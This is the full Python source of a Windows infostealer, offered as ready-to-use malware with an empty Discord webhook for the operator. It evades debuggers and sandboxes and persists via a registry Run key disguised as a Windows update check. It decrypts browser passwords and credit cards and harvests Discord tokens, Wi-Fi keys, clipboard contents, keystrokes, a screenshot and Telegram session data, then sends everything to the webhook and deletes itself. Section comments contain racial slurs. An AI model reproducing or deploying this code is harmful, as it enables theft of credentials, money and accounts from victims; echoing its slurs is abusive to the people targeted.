# WINDOWS INFOSTEALER - Discord webhook only - full features
# Dependencies: pip install requests pywin32 cryptography pillow psutil wmi pycryptodome pyasn1 pynput

import os
import json
import base64
import sqlite3
import shutil
import win32crypt
import win32api
import win32con
import win32clipboard
import requests
import getpass
import platform
import subprocess
import re
import glob
import time
import sys
import ctypes
import psutil
import wmi
from datetime import datetime, timezone
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from pathlib import Path
from zipfile import ZipFile, ZIP_DEFLATED
from ctypes import windll, c_char_p, c_void_p, c_int, byref, POINTER, Structure

try:
    from PIL import ImageGrab
    SCREENSHOT = True
except ImportError:
    SCREENSHOT = False

try:
    from pynput.keyboard import Listener
    KEYLOGGER = True
except ImportError:
    KEYLOGGER = False

# ────────────────────────────────────────────────
#               DC NIGGER WEBHOOK ONLY PUT INSIDE THIS " "
# ────────────────────────────────────────────────

DISCORD_WEBHOOK = ""

# ────────────────────────────────────────────────
#                   ANTI NIGGER DEBUG
# ────────────────────────────────────────────────

def is_debugged():
    if windll.kernel32.IsDebuggerPresent():
        return True
    suspicious = ['x64dbg', 'ollydbg', 'ida', 'windbg', 'ghidra']
    for p in psutil.process_iter(['name']):
        if p.info['name'].lower() in suspicious:
            return True
    return False

def is_sandbox_or_vm():
    c = wmi.WMI()
    for sys in c.Win32_ComputerSystem():
        if 'virtual' in sys.Model.lower() or 'vmware' in sys.Manufacturer.lower():
            return True
    if psutil.cpu_count(logical=False) <= 2 or psutil.virtual_memory().total < 2*1024**3:
        return True
    bad = ["sandbox", "maltest", "cuckoo", "analysis"]
    if any(b in getpass.getuser().lower() for b in bad) or any(b in platform.node().lower() for b in bad):
        return True
    return False

if is_debugged() or is_sandbox_or_vm():
    sys.exit(0)

# ────────────────────────────────────────────────
#                   HELPERS
# ────────────────────────────────────────────────

def chrome_datetime(chromedate):
    try:
        return str(datetime(1601, 1, 1) + datetime.timedelta(microseconds=chromedate))
    except:
        return str(chromedate)

def get_chrome_master_key(path):
    local_state = path.parent.parent / "Local State"
    if not local_state.exists():
        return None
    with open(local_state, "r", encoding="utf-8") as f:
        data = json.load(f)
    key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_chrome(val, key):
    try:
        if val.startswith(b'v10') or val.startswith(b'v11'):
            iv = val[3:15]
            payload = val[15:]
            return AESGCM(key).decrypt(iv, payload, None).decode()
        return win32crypt.CryptUnprotectData(val, None, None, None, 0)[1].decode()
    except:
        return ""

# ────────────────────────────────────────────────
#             FIREFOX NSS ctypes
# ────────────────────────────────────────────────

class SECItem(Structure):
    _fields_ = [("type", c_int), ("data", POINTER(ctypes.c_ubyte)), ("len", c_int)]

def find_nss3():
    for base in [r"C:\Program Files\Mozilla Firefox", r"C:\Program Files (x86)\Mozilla Firefox"]:
        dll = os.path.join(base, "nss3.dll")
        if os.path.isfile(dll):
            return dll
    return None

def firefox_nss_decrypt(profile: Path, master_pw: str = "") -> str:
    output = "**Firefox (NSS)**\n"
    dll_path = find_nss3()
    if not dll_path:
        return output + "nss3.dll not found\n"

    try:
        nss = ctypes.CDLL(dll_path)
    except:
        return output + "Failed to load nss3.dll\n"

    nss.NSS_Init.argtypes = [c_char_p]
    nss.NSS_Init.restype = c_int
    nss.PK11_GetInternalKeySlot.restype = c_void_p
    nss.PK11_CheckUserPassword.argtypes = [c_void_p, c_char_p]
    nss.PK11_CheckUserPassword.restype = c_int
    nss.PK11SDRDecrypt.argtypes = [POINTER(SECItem), POINTER(SECItem), c_void_p]
    nss.PK11SDRDecrypt.restype = c_int
    nss.NSS_Shutdown.restype = c_int

    if nss.NSS_Init(str(profile).encode()) != 0:
        return output + "NSS_Init failed\n"

    slot = nss.PK11_GetInternalKeySlot()
    if not slot:
        nss.NSS_Shutdown()
        return output + "No key slot\n"

    mp = master_pw.encode() if master_pw else b""
    if nss.PK11_CheckUserPassword(slot, mp) != 0:
        nss.NSS_Shutdown()
        return output + "Master password incorrect or required\n"

    logins = profile / "logins.json"
    if not logins.exists():
        nss.NSS_Shutdown()
        return output + "No logins.json\n"

    with open(logins, "r", encoding="utf-8") as f:
        data = json.load(f)

    count = 0
    for login in data.get("logins", []):
        try:
            enc_u = base64.b64decode(login.get("encryptedUsername", ""))
            enc_p = base64.b64decode(login.get("encryptedPassword", ""))
            if not enc_u or not enc_p:
                continue

            # Decrypt password
            in_p = SECItem(0, (ctypes.c_ubyte * len(enc_p))(*enc_p), len(enc_p))
            out_p = SECItem()
            if nss.PK11SDRDecrypt(byref(in_p), byref(out_p), None) == 0:
                pw = ctypes.string_at(out_p.data, out_p.len).decode(errors='ignore').rstrip('\x00')

                # Decrypt username
                in_u = SECItem(0, (ctypes.c_ubyte * len(enc_u))(*enc_u), len(enc_u))
                out_u = SECItem()
                if nss.PK11SDRDecrypt(byref(in_u), byref(out_u), None) == 0:
                    user = ctypes.string_at(out_u.data, out_u.len).decode(errors='ignore').rstrip('\x00')
                    output += f"{login.get('hostname')}\n{user}:{pw}\n\n"
                    count += 1
        except:
            continue

    nss.NSS_Shutdown()
    return output + f"→ {count} logins\n\n"

# ────────────────────────────────────────────────
#                   CREDIT CARDS IDK IF IT WORKS 
# ────────────────────────────────────────────────

def steal_cc(path, name, key):
    db = path / "Web Data"
    if not db.exists():
        return ""
    tmp = f"tempcc_{name}.db"
    shutil.copy2(db, tmp)
    out = f"**{name} CC**\n"
    try:
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT card_number_encrypted, name_on_card, expiration_month, expiration_year FROM credit_cards")
        for enc, n, m, y in cur.fetchall():
            num = decrypt_chrome(enc, key)
            if num:
                out += f"{n} | {num} | {m:02d}/{y}\n"
        conn.close()
    except:
        pass
    finally:
        try: os.remove(tmp)
        except: pass
    return out

# ────────────────────────────────────────────────
#                   CLIPBOARD + KEYLOGGER SAMPLE
# ────────────────────────────────────────────────

def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return str(data)
    except:
        return ""

keys = []

def on_press(key):
    try:
        keys.append(key.char)
    except:
        keys.append(f"[{key}]")

def quick_keylog():
    if not KEYLOGGER:
        return "**Keylog: pynput missing**\n"
    out = "**Keylog (30s)**\n"
    listener = Listener(on_press=on_press)
    listener.start()
    time.sleep(30)
    listener.stop()
    out += "".join(keys) + "\n\n"
    return out

# ────────────────────────────────────────────────
#                   PERSISTENCE
# ────────────────────────────────────────────────

def add_startup():
    exe = sys.executable if getattr(sys, 'frozen', False) else __file__
    try:
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                                  r"Software\Microsoft\Windows\CurrentVersion\Run",
                                  0, win32con.KEY_SET_VALUE)
        win32api.RegSetValueEx(key, "WindowsUpdateCheck", 0, win32con.REG_SZ, exe)
        win32api.RegCloseKey(key)
    except:
        pass

# ────────────────────────────────────────────────
#                   DISCORD TOKENS + WIFI
# ────────────────────────────────────────────────

def steal_discord():
    paths = [
        Path(os.environ["APPDATA"]) / "discord" / "Local Storage" / "leveldb",
        Path(os.environ["APPDATA"]) / "discordcanary" / "Local Storage" / "leveldb",
    ]
    tokens = set()
    regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}|mfa\.[\w-]{84,}"
    for p in paths:
        if not p.exists(): continue
        for f in glob.glob(str(p / "*")):
            try:
                with open(f, "r", errors="ignore") as fd:
                    tokens.update(re.findall(regex, fd.read()))
            except:
                pass
    return "**Discord Tokens**\n" + "\n".join(list(tokens)[:6]) + "\n\n" if tokens else ""

def steal_wifi():
    try:
        res = "**Wi-Fi**\n"
        out = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
        names = [l.split(":")[1].strip() for l in out.splitlines() if "All User Profile" in l]
        for n in names:
            cmd = f'netsh wlan show profile name="{n}" key=clear'
            pw_out = subprocess.check_output(cmd, shell=True, text=True)
            pw = [l.split(":")[1].strip() for l in pw_out.splitlines() if "Key Content" in l]
            if pw:
                res += f"{n} → {pw[0]}\n"
        return res + "\n"
    except:
        return ""

# ────────────────────────────────────────────────
#                   FORGOT
# ────────────────────────────────────────────────

def zip_tdata():
    src = Path(os.environ["APPDATA"]) / "Telegram Desktop" / "tdata"
    if not src.exists():
        return None, None
    zip_path = os.path.join(os.environ["TEMP"], f"td_{int(time.time())}.zip")
    try:
        with ZipFile(zip_path, 'w', ZIP_DEFLATED) as z:
            for root, _, files in os.walk(src):
                if "cache" in root.lower() or "emoji" in root.lower():
                    continue
                for f in files:
                    if f.lower().endswith(('.jpg','.webp','.tmp')): continue
                    full = os.path.join(root, f)
                    z.write(full, os.path.relpath(full, src))
        size_mb = os.path.getsize(zip_path) // (1024**2)
        return zip_path, f"Telegram tdata ({size_mb} MB)"
    except:
        return None, None

# ────────────────────────────────────────────────
#                   SEND TO DISCORD
# ────────────────────────────────────────────────

def send_to_discord(content: str, files: list = None):
    files = files or []
    try:
        requests.post(DISCORD_WEBHOOK, json={"content": content[:1900] + "..." if len(content) > 1900 else content}, timeout=10)
        for name, path in files:
            if os.path.getsize(path) > 8 * 1024 * 1024: continue  # Discord limit
            with open(path, "rb") as f:
                requests.post(DISCORD_WEBHOOK, files={"file": (name, f)}, timeout=15)
    except:
        pass

# ────────────────────────────────────────────────
#                   SELF DESTRUCT YUP SELF DESTRUCT
# ────────────────────────────────────────────────

def self_destruct():
    path = sys.executable if getattr(sys, 'frozen', False) else __file__
    try:
        cmd = f'ping 127.0.0.1 -n 5 > nul & del /f /q "{path}"'
        subprocess.Popen(cmd, shell=True, creationflags=0x08000000 | 0x00000008)
    except:
        pass

# ────────────────────────────────────────────────
#                   MAIN SHIT
# ────────────────────────────────────────────────

def main():
    add_startup()

    loot = f"**Loot - {getpass.getuser()}@{platform.node()}**\n"
    loot += f"OS: {platform.system()} {platform.release()}\n"
    try:
        loot += f"IP: {requests.get('https://api.ipify.org', timeout=5).text.strip()}\n\n"
    except:
        loot += "IP: failed\n\n"

    browsers = {
        "Chrome": Path(os.environ["LOCALAPPDATA"]) / "Google/Chrome/User Data/Default",
        "Edge":   Path(os.environ["LOCALAPPDATA"]) / "Microsoft/Edge/User Data/Default",
        "Brave":  Path(os.environ["LOCALAPPDATA"]) / "BraveSoftware/Brave-Browser/User Data/Default",
        "Opera":  Path(os.environ["APPDATA"]) / "Opera Software/Opera Stable",
    }

    for name, path in browsers.items():
        if not path.exists(): continue
        key = get_chrome_master_key(path)
        if not key: continue

        # Passwords
        tmp = f"tmp_{name}.db"
        try:
            shutil.copy2(path / "Login Data", tmp)
            conn = sqlite3.connect(tmp)
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            loot += f"**{name}**\n"
            cnt = 0
            for url, u, enc in cur.fetchall():
                pw = decrypt_chrome(enc, key)
                if pw:
                    cnt += 1
                    loot += f"{url} | {u}:{pw}\n"
            loot += f"→ {cnt}\n\n"
            conn.close()
        except:
            pass
        finally:
            try: os.remove(tmp)
            except: pass

        loot += steal_cc(path, name, key)

    # Firefox
    ff_base = Path(os.environ["APPDATA"]) / "Mozilla/Firefox/Profiles"
    if ff_base.exists():
        for p in ff_base.iterdir():
            if p.is_dir():
                loot += firefox_nss_decrypt(p, master_pw="")   # ← add known MP here if you have it

    loot += steal_discord()
    loot += steal_wifi()
    loot += "\n**Clipboard**\n" + get_clipboard() + "\n\n"
    loot += quick_keylog()

    files = []
    if SCREENSHOT:
        try:
            p = os.path.join(os.environ["TEMP"], "ss.png")
            ImageGrab.grab().save(p)
            files.append(("screenshot.png", p))
        except:
            pass

    tz_path, tz_msg = zip_tdata()
    if tz_path:
        files.append(("tdata.zip", tz_path))
        loot += f"\n{tz_msg}\n"

    send_to_discord(loot, files)

    # Cleanup
    for _, p in files:
        try: os.remove(p)
        except: pass

    self_destruct()
    sys.exit(0)

if __name__ == "__main__":
    main()